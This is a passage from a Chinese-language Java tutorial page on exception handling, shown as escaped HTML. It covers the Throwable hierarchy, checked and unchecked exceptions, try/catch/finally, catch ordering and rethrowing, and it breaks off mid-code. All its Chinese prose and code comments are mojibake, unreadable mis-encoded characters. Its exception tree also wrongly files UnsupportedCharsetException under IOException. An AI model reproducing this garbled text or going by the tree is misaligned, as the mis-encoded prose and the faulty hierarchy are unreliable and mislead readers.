&lt;li>Javaå†…ç½®å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œæ˜¯ä¸€ç§&lt;code>class&lt;/code>ï¼Œæœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼›å¼‚å¸¸å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æŠ›å‡ºï¼Œä½†åªéœ€è¦åœ¨ä¸Šå±‚æ•è·ï¼Œè¿™æ ·å¯ä»¥åšåˆ°å’Œæ–¹æ³•è°ƒç”¨åˆ†ç¦»&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>try {
String s = processFile(â€œC:\\test.txtâ€);
// ok:
} catch (FileNotFoundException e) {
// file not found:
} catch (SecurityException e) {
// no read permission:
} catch (IOException e) {
// io error:
} catch (Exception e) {
// other error:
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>ç»§æ‰¿å…³ç³»æ˜¯è¿™æ ·çš„&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227002539516.png" alt="image-20220227002539516">&lt;/p>
&lt;p>&lt;code>Throwable&lt;/code>æ˜¯å¼‚å¸¸ä½“ç³»çš„æ ¹ï¼Œå®ƒç»§æ‰¿è‡ª&lt;code>Object&lt;/code>&lt;/p>
&lt;p>&lt;code>Error&lt;/code>è¡¨ç¤ºä¸¥é‡é”™è¯¯ï¼Œæ¯”å¦‚&lt;code>OutofMemoryError&lt;/code>, &lt;code>NoClassDefFoundError&lt;/code>, &lt;code>StackOverflowError&lt;/code>&lt;/p>
&lt;p>&lt;code>Exception&lt;/code>è¡¨ç¤ºè¿è¡Œæ—¶çš„å¼‚å¸¸ï¼Œå¯ä»¥è¢«æ•è·å¹¶å¤„ç†ï¼Œæ¯”å¦‚&lt;code>NumberFormatException&lt;/code>, &lt;code>FileNotFoundException&lt;/code>, &lt;code>SocketException&lt;/code>ï¼›è¿˜åŒ…æ‹¬ä¸€äº›å¯ä¿®æ­£çš„è¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚&lt;code>NullPointerException&lt;/code>, &lt;code>IndexOutOfBoundsException&lt;/code>&lt;/p>
&lt;ul>
&lt;li>å¸¸ç”¨å¼‚å¸¸&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-ascii" data-lang="ascii">Exception
â”‚
â”œâ”€ RuntimeException
â”‚ â”‚
â”‚ â”œâ”€ NullPointerException
â”‚ â”‚
â”‚ â”œâ”€ IndexOutOfBoundsException
â”‚ â”‚
â”‚ â”œâ”€ SecurityException
â”‚ â”‚
â”‚ â””â”€ IllegalArgumentException
â”‚ â”‚
â”‚ â””â”€ NumberFormatException
â”‚
â”œâ”€ IOException
â”‚ â”‚
â”‚ â”œâ”€ UnsupportedCharsetException
â”‚ â”‚
â”‚ â”œâ”€ FileNotFoundException
â”‚ â”‚
â”‚ â””â”€ SocketException
â”‚
â”œâ”€ ParseException
â”‚
â”œâ”€ GeneralSecurityException
â”‚
â”œâ”€ SQLException
â”‚
â””â”€ TimeoutException
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>å¿…é¡»æ•è·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬&lt;code>Exception&lt;/code>åŠå…¶å­ç±»ï¼Œä½†ä¸åŒ…æ‹¬&lt;code>RuntimeException&lt;/code>åŠå…¶å­ç±»ï¼Œè¿™ç§ç±»å‹çš„å¼‚å¸¸ç§°ä¸ºChecked Exception&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœä¸æ•è·Checked Exceptionï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯æ–¹æ³•å®šä¹‰æ—¶ä½¿ç”¨&lt;code>throws Xxx&lt;/code>è¡¨ç¤ºè¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ï¼Œå¯¼è‡´è°ƒç”¨æ–¹åœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¿…é¡»å¼ºåˆ¶æ•è·è¿™äº›å¼‚å¸¸&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸éœ€è¦æ•è·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬&lt;code>Error&lt;/code>åŠå…¶å­ç±»ï¼Œ&lt;code>RuntimeException&lt;/code>åŠå…¶å­ç±»&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ•è·å¼‚å¸¸éœ€è¦æå‰import&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸­æ–‡&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åªè¦æ˜¯æ–¹æ³•å£°æ˜çš„Checked Exceptionï¼Œä¸åœ¨è°ƒç”¨å±‚æ•è·ï¼Œä¹Ÿå¿…é¡»åœ¨æ›´é«˜çš„è°ƒç”¨å±‚æ•è·ï¼›æ‰€æœ‰æœªæ•è·çš„å¼‚å¸¸ï¼Œæœ€ç»ˆä¹Ÿå¿…é¡»åœ¨&lt;code>main()&lt;/code>æ–¹æ³•ä¸­æ•è·&lt;/li>
&lt;li>æ‰€æœ‰å¼‚å¸¸éƒ½å¯ä»¥è°ƒç”¨&lt;code>printStackTrace()&lt;/code>æ–¹æ³•æ‰“å°å¼‚å¸¸æ ˆ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å…ˆè®°ä¸‹æ¥å†è¯´:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æœä¸æƒ³ç”¨tryå¯ä»¥ç›´æ¥æŠŠ&lt;code>main()&lt;/code>æ–¹æ³•å®šä¹‰ä¸º&lt;code>throws Exception&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.UnsupportedEncodingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Arrays&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸­æ–‡&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">toGBK&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GBK&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›¸å½“äºå£°æ˜äº†æ‰€æœ‰å¯èƒ½æŠ›å‡ºçš„Exceptionï¼Œä¹Ÿå°±ä¸ç”¨æ•è·äº†ï¼›ä»£ä»·å°±æ˜¯ä¸€æ—¦å‘ç”Ÿå¼‚å¸¸ï¼Œç¨‹åºä¼šç«‹åˆ»é€€å‡ºï¼Œä¸å¤Ÿçµæ´»&lt;/p>
&lt;ul>
&lt;li>å½“æ–¹æ³•å£°æ˜äº†å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå¯ä»¥æ²¡æœ‰&lt;code>catch&lt;/code>ï¼Œåªä½¿ç”¨&lt;code>try ... finally&lt;/code>ç»“æ„&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;END&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯ä»¥ä¸€ä¸ªtryå¯¹å¤šä¸ªcatchï¼Œæ­¤æ—¶æ³¨æ„catchçš„é¡ºåºï¼šå­ç±»åœ¨å‰ï¼Œé¿å…çŸ­è·¯&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process3&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IO error&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnsupportedEncodingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// æ°¸è¿œæ•è·ä¸åˆ° ä¼šè¢«ä¸Šé¢çš„æˆªèƒ¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bad encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æŠ›å‡ºå¼‚å¸¸">æŠ›å‡ºå¼‚å¸¸&lt;/h3>
&lt;ul>
&lt;li>åˆ†ä¸¤æ­¥ï¼šåˆ›å»ºæŸä¸ª&lt;code>Exception&lt;/code>çš„å®ä¾‹ -&amp;gt; æŠ›å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¦‚æœä¸€ä¸ªæ–¹æ³•æ•è·äº†æŸä¸ªå¼‚å¸¸åï¼Œåˆåœ¨&lt;code>catch&lt;/code>å­å¥ä¸­æŠ›å‡ºæ–°çš„å¼‚å¸¸ï¼Œå°±ç›¸å½“äºæŠŠæŠ›å‡ºçš„å¼‚å¸¸ç±»å‹â€œè½¬æ¢â€äº†ï¼›æ³¨æ„ä¸ºäº†èƒ½è¿½è¸ªåˆ°å®Œæ•´çš„å¼‚å¸¸æ ˆï¼Œåœ¨æ„é€ å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹çš„&lt;code>Exception&lt;/code>å®ä¾‹ä¼ è¿›å»&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process1&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 01
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 05
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process1&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">process2&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 02
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NullPointerException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// throw new IllegalArgumentException();
